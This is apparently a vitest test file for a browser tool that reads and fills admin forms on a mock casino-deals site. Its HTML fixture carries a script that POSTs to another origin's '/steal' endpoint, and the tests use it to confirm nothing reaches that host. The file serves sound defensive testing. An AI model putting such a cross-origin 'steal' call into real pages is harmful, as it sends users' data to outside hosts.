import { describe, expect, it } from 'vitest';
import http from 'http';
import fs from 'fs';
import type { AddressInfo } from 'net';
import { fillAdminForm, inspectAdminPage } from './adminForms';

const chrome = ['/opt/pw-browsers/chromium/chrome-linux/chrome', '/opt/pw-browsers/chromium-1194/chrome-linux/chrome'].find((p) => fs.existsSync(p));
let playwrightAvailable = true;
try { await import(/* @vite-ignore */ 'playwright' as string); } catch { playwrightAvailable = false; }

const FORM = `<!doctype html><html><body><nav><a href="/admin/deals">Deals</a> <a href="/admin/deals/new">Add deal</a></nav>
<h1>New deal</h1>
<form method="post" action="/admin/deals">
  <label for="casino">Casino *</label><input id="casino" name="casino" required>
  <label>Offer <textarea name="offer"></textarea></label>
  <div><span>Promo code</span><input name="code" placeholder="e.g. SPIN50"></div>
  <label for="cat">Category</label><select id="cat" name="category"><option value="">Choose…</option><option value="sweeps">Sweepstakes</option><option value="real">Real money</option></select>
  <label for="exp">Expires</label><input id="exp" name="expires" type="date">
  <fieldset><legend>Audience</legend><label><input type="radio" name="aud" value="new">New players</label><label><input type="radio" name="aud" value="all">Everyone</label></fieldset>
  <label><input type="checkbox" name="featured"> Featured</label>
  <p>Details</p><div class="editor" contenteditable="true"></div>
  <input type="hidden" name="csrf" value="t">
  <button type="submit">Save deal</button>
</form>
<form action="/search"><input type="search" name="q"></form>
<script>fetch('OTHER/steal', { method: 'POST', body: 'x' }).catch(() => {});</script>
</body></html>`;

/** A tiny admin: a deals list, a form to add one, server-side validation, and a login wall. */
function admin(otherOrigin: string) {
  const hits: string[] = [];
  const deals: Record<string, string>[] = [];
  const server = http.createServer((req, res) => {
    hits.push(`${req.method} ${req.url}`);
    const authed = (req.headers.cookie ?? '').includes('session=ok');
    if (!authed) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end('<form><input type="password" name="p"></form>');
      return;
    }
    if (req.method === 'GET' && req.url === '/admin/deals/new') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(FORM.replace('OTHER', otherOrigin));
      return;
    }
    if (req.method === 'POST' && req.url === '/admin/deals') {
      let body = '';
      req.on('data', (c) => (body += c));
      req.on('end', () => {
        const values = Object.fromEntries(new URLSearchParams(body));
        if (values.casino === 'Nope') {
          res.writeHead(422, { 'Content-Type': 'text/html; charset=utf-8' });
          res.end('<div class="error">Casino is not on the approved list</div>');
          return;
        }
        deals.push(values);
        res.writeHead(303, { Location: '/admin/deals' });
        res.end();
      });
      return;
    }
    if (req.url === '/admin/deals') {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(`<h1>Deals</h1><ul>${deals.map((d) => `<li>${d.casino}: ${d.offer}</li>`).join('')}</ul>`);
      return;
    }
    res.writeHead(404);
    res.end();
  });
  return { server, hits, deals };
}

describe.skipIf(!chrome || !playwrightAvailable)('admin forms (real browser, local site)', () => {
  const withSite = async <T>(cookie: string, work: (base: string, site: ReturnType<typeof admin>, other: ReturnType<typeof admin>) => Promise<T>) => {
    const other = admin('');
    await new Promise<void>((r) => other.server.listen(0, '127.0.0.1', r));
    const site = admin(`http://localhost:${(other.server.address() as AddressInfo).port}`);
    await new Promise<void>((r) => site.server.listen(0, '127.0.0.1', r));
    const base = `http://127.0.0.1:${(site.server.address() as AddressInfo).port}`;
    try {
      return await work(base, site, other);
    } finally {
      site.server.close();
      other.server.close();
    }
  };
  const cookies = (value: string) => [{ name: 'session', value, domain: '127.0.0.1', path: '/' }];
  const opts = { allowInsecure: true, executablePath: chrome };

  it('reads the form a person sees: labels, types, choices, required fields and the save button', async () => {
    const snapshot = await withSite('ok', (base) => inspectAdminPage({ baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok') }, opts));
    expect(snapshot.loggedIn).toBe(true);
    const byKey = Object.fromEntries(snapshot.fields.map((f) => [f.key, f]));
    expect(Object.keys(byKey)).toEqual(['casino', 'offer', 'promo_code', 'category', 'expires', 'featured', 'details', 'audience']);
    expect(byKey.casino).toMatchObject({ label: 'Casino', type: 'text', selector: '#casino', required: true });
    expect(byKey.offer).toMatchObject({ type: 'textarea', selector: 'textarea[name="offer"]' });
    expect(byKey.promo_code).toMatchObject({ placeholder: 'e.g. SPIN50' });
    expect(byKey.category!.options).toEqual([{ value: '', label: 'Choose…' }, { value: 'sweeps', label: 'Sweepstakes' }, { value: 'real', label: 'Real money' }]);
    expect(byKey.expires!.type).toBe('date');
    expect(byKey.featured!.type).toBe('checkbox');
    expect(byKey.details!.type).toBe('richtext');
    expect(byKey.audience).toMatchObject({ type: 'radio', options: [{ value: 'new', label: 'New players' }, { value: 'all', label: 'Everyone' }] });
    expect(snapshot.submit).toMatchObject({ label: 'Save deal' });
    expect(snapshot.links.map((l) => l.text)).toEqual(['Deals', 'Add deal']);
    expect(snapshot.headings).toEqual(['New deal']);
  }, 60_000);

  it('fills the form on a dry run without sending anything, and shows it in a screenshot', async () => {
    await withSite('ok', async (base, site, other) => {
      const snapshot = await inspectAdminPage({ baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok') }, opts);
      const result = await fillAdminForm({ baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok'), fields: snapshot.fields, values: { casino: 'Golden Hearts', offer: '$20 → 40 SC' }, submit: false, submitSelector: snapshot.submit!.selector }, opts);
      expect(result).toMatchObject({ submitted: false, missing: [], errors: [] });
      expect(result.screenshot?.length).toBeGreaterThan(1000);
      expect([...site.hits, ...other.hits].filter((h) => !h.startsWith('GET'))).toEqual([]);
      expect(site.deals).toEqual([]);
    });
  }, 60_000);

  it('saves on the site only: the record is created and nothing is sent to another host', async () => {
    await withSite('ok', async (base, site, other) => {
      const snapshot = await inspectAdminPage({ baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok') }, opts);
      const result = await fillAdminForm({
        baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok'), fields: snapshot.fields, submit: true, submitSelector: snapshot.submit!.selector,
        values: { casino: 'Golden Hearts', offer: '$20 → 40 SC', promo_code: 'HEART40', category: 'sweeps', expires: '2026-11-01', audience: 'new', featured: true },
      }, opts);
      expect(result).toMatchObject({ submitted: true, errors: [], missing: [] });
      expect(result.url).toBe(`${base}/admin/deals`);
      expect(result.text).toContain('Golden Hearts: $20 → 40 SC');
      expect(site.deals).toEqual([{ casino: 'Golden Hearts', offer: '$20 → 40 SC', code: 'HEART40', category: 'sweeps', expires: '2026-11-01', aud: 'new', featured: 'on', csrf: 't' }]);
      expect(other.hits.filter((h) => !h.startsWith('GET'))).toEqual([]);
    });
  }, 60_000);

  it('reports the form’s own errors and browser validation instead of claiming success', async () => {
    await withSite('ok', async (base, site) => {
      const snapshot = await inspectAdminPage({ baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok') }, opts);
      const session = { baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok'), fields: snapshot.fields, submit: true, submitSelector: snapshot.submit!.selector };
      const rejected = await fillAdminForm({ ...session, values: { casino: 'Nope', offer: 'x' } }, opts);
      expect(rejected.errors).toEqual(['Casino is not on the approved list']);
      const invalid = await fillAdminForm({ ...session, values: { offer: 'no casino' } }, opts);
      expect(invalid.submitted).toBe(false);
      expect(invalid.errors[0]).toMatch(/^Casino \*: /);
      expect(site.deals).toEqual([]);
    });
  }, 60_000);

  it('notices a changed form and a signed-out session', async () => {
    await withSite('ok', async (base) => {
      const changed = await fillAdminForm({ baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('ok'), fields: [{ key: 'brand', label: 'Brand', type: 'text', selector: '#brand', required: true }], values: { brand: 'X' }, submit: true, submitSelector: 'button' }, opts);
      expect(changed).toMatchObject({ submitted: false, missing: ['brand'] });
      const out = await inspectAdminPage({ baseUrl: base, url: `${base}/admin/deals/new`, cookies: cookies('expired') }, opts);
      expect(out).toMatchObject({ loggedIn: false, fields: [] });
    });
  }, 60_000);
});
